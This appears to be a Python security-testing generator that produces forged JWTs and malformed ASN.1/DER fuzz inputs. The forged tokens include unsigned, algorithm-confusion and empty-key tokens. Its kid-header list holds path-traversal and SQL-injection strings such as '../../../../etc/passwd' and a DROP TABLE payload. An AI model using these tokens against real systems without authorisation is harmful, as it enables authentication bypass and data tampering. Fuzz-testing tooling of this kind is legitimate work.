"""
mock-jutsu — JWT Attack & ASN.1 Fuzzing Payload Generator
Developer: Altan Sezer Ayan - A.S.A (https://github.com/altansayan)

Supported types:
  jwt_attack  — Crafted JWT tokens for security testing:
                none_alg, expired, invalid_signature, alg_confusion,
                kid_injection, empty_password
  asn1_fuzz   — ASN.1/DER malformed payloads for fuzzing:
                truncated, overflow_length, wrong_tag, nested_mismatch,
                zero_length, random_bytes

Zero external dependencies: base64, hashlib, hmac, json, random, time, uuid (stdlib only).
"""

import base64
import hashlib
import hmac
import json
import random
import time
import uuid


def _rand_uuid() -> str:
    return str(uuid.uuid4())


def _b64url_enc(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _hmac_sha256(key: bytes, msg: bytes) -> bytes:
    return hmac.new(key, msg, hashlib.sha256).digest()


def _sign_hs256(header_b64: str, payload_b64: str, key: bytes) -> str:
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = _hmac_sha256(key, signing_input)
    return _b64url_enc(sig)


_SECRET_KEY = b"mock-jutsu-default-secret-key-2025"

_KID_INJECTION_VALUES = [
    "../../dev/null",
    "' OR 1=1 --",
    "../../../../etc/passwd",
    "/dev/null\x00",
    "'; DROP TABLE keys; --",
    "../keys/public.pem",
]

_ATTACK_DESCRIPTIONS = {
    'none_alg':           "CVE bypass: JWT 'alg: none' — server accepts unsigned token",
    'expired':            "Replay attack: token with exp in the past (1 hour ago)",
    'invalid_signature':  "Signature bit-flip: last 4 bytes XOR 0xFF — should fail HMAC verify",
    'alg_confusion':      "Algorithm confusion: RS256 header but HMAC-HS256 signed with public key",
    'kid_injection':      "Key ID injection: path traversal / SQL in 'kid' header field",
    'empty_password':     "HMAC empty key: signed with b'' — common misconfiguration",
}


# ── JWT Attack ────────────────────────────────────────────────────────────────

def _base_payload() -> dict:
    now = int(time.time())
    return {
        'sub': _rand_uuid(),
        'iat': now,
        'exp': now + 3600,
        'jti': _rand_uuid(),
        'role': random.choice(['user', 'admin', 'service']),
    }


def _make_jwt(header: dict, payload: dict, key: bytes) -> str:
    h = _b64url_enc(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    sig = _sign_hs256(h, p, key)
    return f"{h}.{p}.{sig}"


def _attack_none_alg() -> dict:
    header  = {'alg': 'none', 'typ': 'JWT'}
    payload = _base_payload()
    h = _b64url_enc(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url_enc(json.dumps(payload, separators=(',', ':')).encode())
    return {'token': f"{h}.{p}.", 'attack_type': 'none_alg'}


def _attack_expired() -> dict:
    header  = {'alg': 'HS256', 'typ': 'JWT'}
    payload = _base_payload()
    payload['exp'] = int(time.time()) - random.randint(3600, 86400)
    return {'token': _make_jwt(header, payload, _SECRET_KEY), 'attack_type': 'expired'}


def _attack_invalid_signature() -> dict:
    header  = {'alg': 'HS256', 'typ': 'JWT'}
    payload = _base_payload()
    token   = _make_jwt(header, payload, _SECRET_KEY)
    parts   = token.split('.')
    # Decode sig, flip last 4 bytes, re-encode
    sig_bytes = bytearray(base64.urlsafe_b64decode(parts[2] + '=='))
    for i in range(1, min(5, len(sig_bytes) + 1)):
        sig_bytes[-i] ^= 0xFF
    parts[2] = _b64url_enc(bytes(sig_bytes))
    return {'token': '.'.join(parts), 'attack_type': 'invalid_signature'}


def _attack_alg_confusion() -> dict:
    # Claim RS256 in header but sign with HS256 using a weak "public key"
    fake_public_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA\n-----END PUBLIC KEY-----"
    header  = {'alg': 'RS256', 'typ': 'JWT'}
    payload = _base_payload()
    return {'token': _make_jwt(header, payload, fake_public_key), 'attack_type': 'alg_confusion'}


def _attack_kid_injection() -> dict:
    kid    = random.choice(_KID_INJECTION_VALUES)
    header = {'alg': 'HS256', 'typ': 'JWT', 'kid': kid}
    payload = _base_payload()
    return {'token': _make_jwt(header, payload, _SECRET_KEY), 'attack_type': 'kid_injection'}


def _attack_empty_password() -> dict:
    header  = {'alg': 'HS256', 'typ': 'JWT'}
    payload = _base_payload()
    return {'token': _make_jwt(header, payload, b''), 'attack_type': 'empty_password'}


_ATTACK_BUILDERS = [
    _attack_none_alg,
    _attack_expired,
    _attack_invalid_signature,
    _attack_alg_confusion,
    _attack_kid_injection,
    _attack_empty_password,
]


def generate_jwt_attack() -> str:
    builder = random.choice(_ATTACK_BUILDERS)
    result  = builder()
    result['description'] = _ATTACK_DESCRIPTIONS[result['attack_type']]
    return json.dumps(result, ensure_ascii=False)


# ── ASN.1 Fuzz ────────────────────────────────────────────────────────────────

def _hex(data: bytes) -> str:
    return data.hex()


def _asn1_truncated() -> dict:
    n   = random.randint(8, 32)
    tag = random.choice([0x30, 0x02, 0x04, 0x06])  # SEQUENCE, INTEGER, OCTET STRING, OID
    # Declare n bytes but only provide n//2
    payload = bytes([random.randint(0, 255) for _ in range(n // 2)])
    data    = bytes([tag, n]) + payload
    return {'hex': _hex(data), 'fuzz_type': 'truncated', 'declared_length': n, 'actual_bytes': len(payload)}


def _asn1_overflow_length() -> dict:
    tag = random.choice([0x30, 0x02])
    # Long-form DER: 0x82 = 2-byte length follows → claim 65536 bytes
    length_bytes = bytes([0x82, 0xFF, 0xFF])
    tiny_payload = bytes([random.randint(0, 255) for _ in range(4)])
    data = bytes([tag]) + length_bytes + tiny_payload
    return {'hex': _hex(data), 'fuzz_type': 'overflow_length', 'claimed_length': 65535}


def _asn1_wrong_tag() -> dict:
    # Reserved / invalid tags: 0x00, 0x0F, 0x1F (long-form start), 0xFF
    bad_tags = [0x00, 0x0F, 0x1F, 0xFF, 0x3F, 0x7F, 0xBF]
    tag     = random.choice(bad_tags)
    n       = random.randint(2, 12)
    payload = bytes([random.randint(0, 255) for _ in range(n)])
    data    = bytes([tag, n]) + payload
    return {'hex': _hex(data), 'fuzz_type': 'wrong_tag', 'tag_byte': hex(tag)}


def _asn1_nested_mismatch() -> dict:
    # SEQUENCE (0x30) that wraps an INTEGER (0x02) with wrong inner length
    inner_actual = bytes([random.randint(0, 255) for _ in range(4)])
    inner        = bytes([0x02, 8]) + inner_actual   # claims 8 bytes, provides 4
    outer        = bytes([0x30, len(inner)]) + inner
    return {'hex': _hex(outer), 'fuzz_type': 'nested_mismatch', 'inner_claimed': 8, 'inner_actual': 4}


def _asn1_zero_length() -> dict:
    # Valid tag with 0x00 length (empty value)
    tag  = random.choice([0x30, 0x02, 0x04, 0x05, 0x13])
    data = bytes([tag, 0x00])
    return {'hex': _hex(data), 'fuzz_type': 'zero_length', 'tag_byte': hex(tag)}


def _asn1_random_bytes() -> dict:
    # Valid outer shell (SEQUENCE tag + correct length) but random payload
    n       = random.randint(4, 24)
    payload = bytes([random.randint(0, 255) for _ in range(n)])
    data    = bytes([0x30, n]) + payload
    return {'hex': _hex(data), 'fuzz_type': 'random_bytes', 'length': n}


_FUZZ_BUILDERS = [
    _asn1_truncated,
    _asn1_overflow_length,
    _asn1_wrong_tag,
    _asn1_nested_mismatch,
    _asn1_zero_length,
    _asn1_random_bytes,
]


def generate_asn1_fuzz() -> str:
    builder = random.choice(_FUZZ_BUILDERS)
    result  = builder()
    return json.dumps(result, ensure_ascii=False)


# ── Generator class ────────────────────────────────────────────────────────────

class CryptoFuzzGenerator:
    """JWT attack payloads and ASN.1/DER fuzzing sequences."""

    def generate(self, data_type: str, **kwargs) -> str:
        if data_type == 'jwt_attack':
            return generate_jwt_attack()
        if data_type == 'asn1_fuzz':
            return generate_asn1_fuzz()
        return f"ERROR: Unknown type '{data_type}'"
